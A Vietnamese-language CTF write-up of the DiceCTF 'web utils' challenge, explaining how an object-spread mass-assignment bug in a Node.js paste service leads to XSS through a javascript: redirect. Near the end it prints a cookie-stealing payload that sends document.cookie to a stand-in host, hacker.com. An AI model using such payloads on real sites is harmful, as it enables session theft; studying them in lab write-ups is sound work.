# web utils
Do giải này diễn ra vào dịp tết nên mình không chơi trong thời gian giải diễn ra được mà chỉ khi giải đã kết thúc được 2 ngày và mình cũng cọ xong bộ ghế vs bàn ở nhà thì mới liếc qua được.

Bài này được cho source bằng node.js. Cùng tóm tắt qua một số chức năng của web nào

Đầu tiên là file index.js 

![img1](https://github.com/Cl0wnK1n9/diceCTF/blob/main/img/Capture1.JPG)

Khi truy cập vào các đường dẫn như /api/ hoặc /view/ thì server sẽ tự động gọi các hàm từ /routers/api/ hoặc /routers/view/ để xử lý requests

Chúng ta sẽ tiếp tục đi vào api.js và bỏ qua view.js vì nó chỉ render view.html lên mà thôi chứ không làm gì nhiều .

![img2](https://github.com/Cl0wnK1n9/diceCTF/blob/main/img/Capture2.JPG)

đầu tiên là createLink, hàm này được thực thi khi có 1 POST request đến đường dẫn /api/createLink/ nó sẽ kiểm tra xem url mới được tạo ra có bắt đầy bằng https hay không nếu đúng thì sẽ add vào database còn không thì sẽ trả về thông bào lỗi `Invalid URL`

Tiếp theo là createPaste, hàm này được thực thi khi có 1 POST request đến đường dẫn /api/createPaste/ đầu tiên hàm này sẽ tạo ra 1 chuỗi uid ngẫu nhiên gồm 8 ký tự sau đó add thẳng dữ liệu vào trong database. Thế thôi :v

Cuối cùng là hàm lấy dữ liệu, hàm này được thực thi khi có 1 POST request đến đường dẫn /api/data/`uid` với uid là tham số. Hàm này sẽ lấy dữ liệu trừ database và trả về kết quả bao gồm `statusCode:200`, `data` nội dung dữ liệu và `type` là kiểu dữ liệu.

Đối với việc xử lý dữ liệu với database đều sử dụng prestatement nên không có chỗ sql injection. 

![img3](https://github.com/Cl0wnK1n9/diceCTF/blob/main/img/Capture3.JPG)

Hãy cùng xem dữ liệu được hiển thị như nào trong file view.html

![img4](https://github.com/Cl0wnK1n9/diceCTF/blob/main/img/Capture4.JPG)

Sử dụng 1 đoạn js để lấy dữ liệu từ /api/ `const res = await fetch(``${window.origin}/api/data/${id}``);` 

sau đó kiểm tra trường `data` và `type` trong json được trả về. Nếu không có 1 trong 2 trường này thì sẽ redirect về trang chủ. Nếu `type` là `link` thì sẽ redirect đến đường dẫn trong `data` ( ở đây là shorten link được tạo ra ). Các trường hợp còn lại sẽ hiển thị dữ liệu `data` ra thẻ div. Well `document.querySelector('div').textContent = data;` đoạn này đã khiến những thứ như `<>` ... sẽ bị html encode và hiển thị như 1 text nên không thể thực hiện xss trực tiếp từ đây. Tuy nhiên mình để ý đến 2 điều trong đống source code này đầu tiên chính là hàm tạo paste mới và thứ 2 chính là khi `type==='link'` thì sẽ set lại giá trị cho window.location. `<= không biết chấm hết câu sao cho hợp lý luôn .-.`

Đầu tiên cùng đi sâu vào hàm tạo paste mới (createPaste)

`database.addData({ type: 'paste', ...req.body, uid });` đây là đoạn code sẽ ghi dữ liệu vào trong database. Nhưng bạn để ý nhé dầu `...` việc sử dụng `...` sẽ định nghĩa `req.body` là 1 object và đồng thời sẽ ghi đè lên những tham số trước đó nếu nó bị trùng ( xem thêm tại [đây](https://oprea.rocks/blog/what-do-the-three-dots-mean-in-javascript/) ). Điều đó có nghĩa là mình hoàn toàn có thể điều khiển được `type` thành `link` và như ở trên mình đã nói khi `type==='link'` thì sẽ set lại giá trị cho window.location và nếu giá trị của window.location là `javascript:alert(1)` thì sẽ xảy ra xss. 

Và đây là kết quả: 

![img5](https://github.com/Cl0wnK1n9/diceCTF/blob/main/img/Capture5.JPG)

![img6](https://github.com/Cl0wnK1n9/diceCTF/blob/main/img/Capture6.JPG)

sau đó lấy cookie bằng n cách khác nhau cách của mình là `window.location="https://hacker.com?a="%2bdocument.cookie`

![img7](https://github.com/Cl0wnK1n9/diceCTF/blob/main/img/Capture7.JPG)
